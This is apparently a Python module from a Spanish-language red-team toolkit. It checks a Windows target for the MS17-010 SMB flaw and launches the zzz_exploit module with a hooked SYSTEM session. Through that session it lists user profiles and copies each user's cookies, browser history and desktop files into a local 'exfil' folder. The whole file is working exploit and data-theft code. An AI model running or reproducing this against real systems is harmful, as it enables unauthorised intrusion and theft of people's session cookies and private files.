import os
import sys

sys.path.append(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
)

from config.settings import TARGET_IP
from Agentes.Red.Herramientas.ms17_010_checker import check_vulnerability

EXTRACT_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))),
    "Telemetria", "exfil"
)


def _download_file(smb_conn, share, remote_path, local_path):
    try:
        os.makedirs(os.path.dirname(local_path), exist_ok=True)
        with open(local_path, "wb") as f:
            smb_conn.getFile(share, remote_path, f.write)
        size = os.path.getsize(local_path)
        print(f"  [✅] {remote_path} ({size} bytes)")
        return True
    except Exception as e:
        print(f"  [❌] {remote_path}: {e}")
        return False


def _list_users(smb_conn):
    users = []
    try:
        for entry in smb_conn.listPath("C$", "Documents and Settings\\*"):
            name = entry.get_longname()
            if name not in (".", "..", "All Users", "Default User", "LocalService", "NetworkService"):
                users.append(name)
    except Exception:
        users.append("Administrator")
    return users


def _extraction_session(conn, pipe_name, share, mode):
    print("\n[*] Obteniendo acceso SMB como SYSTEM...")
    smb_conn = conn.get_smbconnection()

    print("[*] (Saltando reg save - congela Windows XP)")
    print("[*] Extrayendo solo archivos accesibles vía SMB...")

    print("\n[*] Listando usuarios...")
    users = _list_users(smb_conn)
    print(f"  → {', '.join(users) if users else 'ninguno'}")

    print("\n[*] Extrayendo datos de usuario...")
    for user in users:
        user_dir = os.path.join(EXTRACT_DIR, "users", user)
        for base in [
            f"Documents and Settings\\{user}\\Cookies\\",
            f"Documents and Settings\\{user}\\Local Settings\\History\\",
            f"Documents and Settings\\{user}\\Desktop\\",
        ]:
            try:
                for entry in smb_conn.listPath("C$", base + "*"):
                    name = entry.get_longname()
                    if name in (".", "..") or entry.is_directory():
                        continue
                    _download_file(smb_conn, "C$", base + name, os.path.join(user_dir, name))
            except Exception:
                pass

    print(f"\n[+] Archivos guardados en: {EXTRACT_DIR}")


def ejecutar_extraccion():
    os.makedirs(EXTRACT_DIR, exist_ok=True)
    print(f"📁 Destino: {EXTRACT_DIR}\n")

    checker = check_vulnerability(TARGET_IP)
    if not checker["vulnerable"]:
        print("[❌] Target no vulnerable.")
        return
    if not checker["pipes"]:
        print("[❌] Sin named pipes.")
        return

    pipe = checker["pipes"][0]
    print(f"[+] Target: {checker['target_os']} | Pipe: {pipe}")

    from Agentes.Red.Herramientas import zzz_exploit as _ze
    _original = _ze.do_system_mysmb_session
    _ze.do_system_mysmb_session = _extraction_session

    try:
        _ze.exploit(TARGET_IP, 445, "", "", pipe, "C$", "SHARE")
    except KeyboardInterrupt:
        print("\n[!] Interrumpido.")
    finally:
        _ze.do_system_mysmb_session = _original

    print("[✅] Extracción completada.")
